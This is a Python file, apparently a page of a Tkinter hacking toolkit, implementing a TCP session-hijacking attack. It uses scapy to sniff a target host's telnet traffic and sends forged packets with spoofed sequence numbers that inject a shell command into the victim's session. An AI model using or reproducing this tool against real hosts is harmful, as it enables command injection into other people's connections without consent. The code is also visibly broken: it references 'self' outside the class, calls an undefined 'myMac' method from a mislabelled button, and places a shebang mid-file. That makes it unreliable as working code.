from scapy.all import *
import subprocess
import sys
import tkinter.messagebox
from socket import *
from threading import Thread,Lock
import sys,re,random, requests, os
import tkinter as tk 
from tkinter import font  as tkfont  
from tkinter import font as tkfont
from tkinter import font, messagebox
import PySimpleGUI as sg
from nav_bar import *

#!/usr/bin/env/ python
import subprocess
import re

#Init Tkinter Frame
class TCPHijack(tk.Frame):
	def __init__(self, parent, controller):
		tk.Frame.__init__(self, parent)
		self.controller = controller
		abtframefont = tkfont.Font(family='Calibri', size=33, weight="bold")
		display_nav_bar(self, controller)
		aboutframe = tk.Label(self, text="    TCP Hijack", bg='#3B5262', fg='white', anchor="c", font=abtframefont)
		aboutframe.place(rely=0.08, relheight=0.12, relwidth=1)

		allscreenframe = tk.Label(self, bg='white')
		allscreenframe.place(rely=0.2, relheight=1, relwidth=1)
        
        # Set Label for ip Entry entry
		label = Label(self,text =" Enter the IP Address:",font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.38, relx=0.16, relheight=0.08, relwidth=0.22)
		# Set input box 
		label = Label(self,text =" Enter the port number(default is 23):",font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.48, relx=0.16, relheight=0.08, relwidth=0.22)
		
		# Set input box for IP Entry
		self.entry = Entry(self, font=('Calibri', 13),)
		self.entry.place(rely=0.38, relx=0.36, relheight=0.08, relwidth=0.3)

		# Set input box for Port Entry
		self.entry2 = Entry(self, font=('Calibri', 13),)
		self.entry2.place(rely=0.48, relx=0.36, relheight=0.08, relwidth=0.3)

		# Start button
		Button(self,text="Click to Change MAC",font=('Calibri', 13),bg='#4D6C84', fg='white', anchor='c', command=self.myMac).place(rely=0.44, relx=0.7, relheight=0.08, relwidth=0.12)

cmd0 = "ip route | grep default | awk '{print $3}'"
out = subprocess.Popen(cmd0, shell=True,
           stdout=subprocess.PIPE,
           stderr=subprocess.STDOUT)
           
#populating gateway and ecoding into utf-8 for Python 3
gateway, stderr = out.communicate()
gateway = gateway.strip()
gateway = gateway.decode("utf-8") 
# ip addres for sniffing
dip = self.entry.get()

#generally port 23 is used for tcp connections can be changed by user 
port  = self.entry2.get()
filter = "host " + dip + " and port " + str(port)

def hijack(p):
     #Prints summary of received packet
     print ("pkt received", p.summary())  
      #If statement to print Seq and Ack of incoming packet
     if p[IP].src == dip and p[IP].dst == gateway:
       print ("Seq: " + str(p[TCP].seq) + " |Ack:" + str(p[TCP].ack))
       print ("Hijck Seq: " + str(p[TCP].ack) + " | Hijack Ack: " + str(p[TCP].seq))
       #populating layers of the frame
       ether = Ether(dst = p[Ether].src, src = p[Ether].dst)
       ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, len=p[IP].len, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, proto=p[IP].proto, id=29321)
       tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", window=p[TCP].window, options=p[TCP].options)
       #combining layers of the frame then sending with command to be run
       #Write GUI to enter command
       #Enter Console command here hijack = ether/ip/tcp/("command"+"\n")
       hijack = ether/ip/tcp/("exit"+"\n")
       rcv=sendp(hijack)

sniff(count=0, prn = lambda p : hijack(p), filter=filter, lfilter = lambda f : f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
